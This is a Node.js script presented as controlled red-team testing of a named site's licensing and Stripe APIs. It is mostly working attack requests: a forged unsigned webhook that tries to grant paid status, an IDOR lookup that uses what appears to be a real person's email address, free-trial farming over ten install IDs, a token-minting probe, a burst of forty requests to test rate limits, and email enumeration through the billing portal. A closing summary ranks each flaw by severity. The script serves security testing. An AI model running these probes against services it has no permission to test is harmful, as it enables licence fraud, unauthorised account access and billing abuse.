/**
 * Controlled red-team probes against warpte.com public APIs.
 * Run: node scripts/redteam-license.mjs
 */
const BASE = process.env.WARP_API || "https://warpte.com";

async function req(method, path, body) {
  const opts = { method, headers: { Accept: "application/json" } };
  if (body !== undefined) {
    opts.headers["Content-Type"] = "application/json";
    opts.body = JSON.stringify(body);
  }
  const t0 = Date.now();
  let res, text;
  try {
    res = await fetch(BASE + path, opts);
    text = await res.text();
  } catch (e) {
    return { ok: false, status: 0, ms: Date.now() - t0, error: String(e) };
  }
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    json = { raw: text.slice(0, 200) };
  }
  return { status: res.status, ms: Date.now() - t0, json };
}

function line(title, r) {
  const j = r.json || {};
  console.log(
    `${title.padEnd(42)} → HTTP ${String(r.status).padStart(3)}  allowed=${j.allowed} pro=${j.pro} status=${j.status || j.error || ""}  ${r.ms}ms`
  );
}

console.log("BASE", BASE);
console.log("--- auth / validation ---");

// 1 debug expire
line(
  "debug-expire wrong secret",
  await req("POST", "/api/license/debug-expire", {
    installId: "bruteforce0001",
    secret: "wrong",
  })
);

// 2 webhook no signature (fake pro grant)
line(
  "webhook no signature (forge pro)",
  await req("POST", "/api/stripe/webhook", {
    type: "customer.subscription.created",
    data: {
      object: {
        status: "active",
        customer: "cus_attacker",
        id: "sub_attacker",
        metadata: {
          email: "redteam-attacker@example.com",
          installId: "redteaminstall001",
        },
      },
    },
  })
);

// check if forge stuck
line(
  "license after forge webhook",
  await req(
    "GET",
    "/api/license?installId=redteaminstall001&email=redteam-attacker@example.com"
  )
);

// 3 IDOR: foreign install + victim pro email
line(
  "IDOR foreign install + pro email",
  await req(
    "GET",
    "/api/license?installId=idordevice0000001&email=alec.cohen97@gmail.com"
  )
);

// 4 checkout spam shape
line(
  "checkout invalid email",
  await req("POST", "/api/stripe/checkout", { email: "not-an-email", installId: "x".repeat(16) })
);

// 5 ably token farm
line(
  "ably token open mint",
  await req("GET", "/api/ably/token?installId=tokenfarmdevice001")
);

// 6 trial farm: many installIds startTrial
console.log("--- trial farm (10 installIds) ---");
const farm = [];
for (let i = 0; i < 10; i++) {
  const id = "farm" + String(i).padStart(12, "0");
  const r = await req("GET", `/api/license?installId=${id}&startTrial=1`);
  farm.push(r.json?.allowed === true && r.json?.status === "trial");
}
console.log(
  `  trials started: ${farm.filter(Boolean).length}/10 (each new installId can mint a trial)`
);

// 7 rate limit probe: 40 rapid license GETs
console.log("--- rate limit (40 GETs) ---");
const codes = {};
let blocked = 0;
for (let i = 0; i < 40; i++) {
  const r = await req(
    "GET",
    `/api/license?installId=ratelimitdev${String(i).padStart(4, "0")}`
  );
  codes[r.status] = (codes[r.status] || 0) + 1;
  if (r.status === 429) blocked++;
}
console.log("  status histogram:", codes, "  429 count:", blocked);

// 8 portal enumeration
line(
  "portal unknown email",
  await req("POST", "/api/stripe/portal", {
    email: "no-such-user-xyz@example.com",
  })
);

// 9 checkout creates stripe session for any email (cost?)
line(
  "checkout valid email shape",
  await req("POST", "/api/stripe/checkout", {
    email: "redteam-checkout@example.com",
    installId: "checkouttest00001",
  })
);

console.log("\n--- summary ---");
console.log(
  "CRITICAL if IDOR pro=true for foreign install with victim email."
);
console.log(
  "HIGH if trial farm succeeds for many installIds (free forever)."
);
console.log("HIGH if webhook without sig grants pro.");
console.log("MED if no 429 under burst (add WAF/rate limit).");
